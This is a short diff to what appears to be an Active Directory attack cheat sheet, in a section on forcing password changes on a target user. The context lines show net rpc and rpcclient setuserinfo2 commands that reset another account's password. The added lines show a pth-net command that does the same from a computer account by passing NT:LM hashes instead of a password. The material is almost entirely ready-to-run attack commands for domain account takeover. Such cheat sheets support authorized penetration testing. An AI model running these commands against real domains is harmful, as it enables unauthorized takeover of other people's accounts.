@@ -9,6 +9,8 @@ net rpc password targetUser -U domain.com/username%password -S dc.domain.com #In
 # rpcclient
 rpcclient -U domain.com/user dcIP
 rpcclient $> setuserinfo2 targetUser 23 newPassUser
+# Computer -> User
+pth-net rpc password "targetUser" "newPassword" -U "domain.com"/'COMPUTER1$'%"NT":"LM" -S "dcIP"
 ```
 
 ## GenericWrite on User
